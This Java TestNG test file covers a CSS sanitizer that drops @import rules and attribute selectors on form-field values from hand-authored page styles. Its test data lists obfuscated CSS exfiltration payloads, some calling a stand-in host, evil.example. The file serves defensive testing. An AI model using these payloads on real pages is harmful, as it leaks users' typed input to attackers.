package org.paulsens.trip.content;

import java.util.ArrayList;
import java.util.List;
import org.testng.Assert;
import org.testng.annotations.DataProvider;
import org.testng.annotations.Test;

/**
 * The CSS rule of hand-authored page HTML ({@link PageCss}): a style block loses a rule that imports a stylesheet
 * or tests a form field's value, and nothing else. (An inline style attribute has no rule; {@code PageHtmlTest}
 * holds that it comes back as typed.)
 */
public class PageCssTest {

    private static String block(final String css) {
        return PageCss.block(css, rule -> { });
    }

    @DataProvider
    public Object[][] refusedRules() {
        return new Object[][] {
            {"@import url(https://evil.example/x.css);"},
            {"@IMPORT 'x.css';"},
            {"@\\69mport 'x.css';"},
            {"@\\000069 mport 'x.css';"},
            {"@i\\mport 'x.css';"},
            {"@import/**/'x.css';"},
            {"input[value^=a]{background:url(https://evil.example/a)}"},
            {"input[ VALUE $= 'a' ]{color:red}"},
            {"input[/* x */value*=a]{color:red}"},
            {"input[\\76 alue^=a]{color:red}"},
            {"input[*|value^=a]{color:red}"},
            {"@media screen{.a{color:red}input[value^=a]{color:red}}"},
            {".a{color:red;& input[value^=a]{color:blue}}"},
            {"a:has(input[value^=a]){color:red}"},
        };
    }

    /** Read as a browser reads it: an escape spells its character, and a comment is not a word. */
    @Test(dataProvider = "refusedRules")
    public void aStyleBlockNeverImportsOrReadsAFieldsValue(final String rule) {
        final List<String> dropped = new ArrayList<>();
        Assert.assertEquals(PageCss.block(".x{top:0}" + rule + ".y{top:1}", dropped::add), ".x{top:0}.y{top:1}");
        Assert.assertEquals(dropped.size(), 1, dropped.toString());
    }

    /** The very same string, so that a stored block comes back byte for byte. */
    @Test
    public void everythingElseInAStyleBlockIsTheAuthors() {
        final String css = "\n/* a } comment { with @import and [value] in it */\n"
                + ".a::before{content:\"} ; { \\\" @imports\";position:fixed;z-index:9}\n"
                + "@keyframes spin{to{transform:rotate(360deg)}}\n@media print{.b{display:none}}\n"
                + "[data-value=a],[values],.value{color:red}\n@font-face{font-family:X;src:url(x.woff2)}\n"
                + ".c{background:url(https://x.example/a.png)} .unclosed{color:red";
        Assert.assertSame(block(css), css);
    }

    @Test
    public void aRefusedRuleIsNamedByItsOpeningWords() {
        final List<String> dropped = new ArrayList<>();
        PageCss.block("@media (max-width:\n 600px) {\n input[value] { color: red } }", dropped::add);
        Assert.assertEquals(dropped, List.of("@media (max-width: 600px)"));
    }
}
